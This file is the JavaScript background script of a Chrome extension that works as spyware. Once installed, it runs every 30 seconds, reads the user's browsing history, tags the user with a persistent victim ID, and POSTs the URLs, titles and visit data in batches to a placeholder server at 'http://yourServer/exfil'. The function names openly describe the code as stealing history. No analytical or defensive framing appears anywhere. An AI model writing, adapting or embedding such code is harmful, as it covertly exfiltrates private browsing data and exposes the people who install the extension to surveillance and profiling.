chrome.runtime.onInstalled.addListener((details) => {
  if (details.reason === 'install') {
    chrome.alarms.create('stealHistory', { periodInMinutes: 0.5 });
  }
});

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === 'stealHistory') {
    stealAndExfiltrate();
  }
});

async function stealAndExfiltrate() {
  const result = await chrome.storage.local.get(['lastStolenTime', 'pendingHistory']);
  let lastStolen = result.lastStolenTime || Date.now() - (24 * 60 * 60 * 1000);
  let pending = result.pendingHistory || [];
  const now = Date.now();

  const historyItems = await chrome.history.search({
    text: '',
    startTime: lastStolen,
    endTime: now,
    maxResults: 500
  });

  for (const item of historyItems) {
    const exists = pending.some(p => p.url === item.url && p.lastVisitTime === item.lastVisitTime);
    if (!exists) {
      pending.push(item);
    }
  }

  await chrome.storage.local.set({ pendingHistory: pending });

  const batchSize = 20;
  let sentCount = 0;

  while (pending.length > 0) {
    const batch = pending.splice(0, batchSize);
    const success = await sendBatchToServer(batch);
    if (success) {
      sentCount += batch.length;
      await chrome.storage.local.set({ pendingHistory: pending });
    } else {

      break;
    }
  }

  if (sentCount > 0) {
    await chrome.storage.local.set({ lastStolenTime: now });
  }
}

async function sendBatchToServer(batch) {
  let { victimId } = await chrome.storage.local.get('victimId');
  if (!victimId) {
    victimId = crypto.randomUUID();
    await chrome.storage.local.set({ victimId });
  }

  const payload = {
    victim_id: victimId,
    timestamp: Date.now(),
    history: batch.map(item => ({
      url: item.url,
      title: item.title,
      lastVisitTime: item.lastVisitTime,
      visitCount: item.visitCount
    }))
  };

  try {
    const response = await fetch('http://yourServer/exfil', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (response.ok) {

      return true;
    } else {

      return false;
    }
  } catch (error) {
    return false;
  }
}
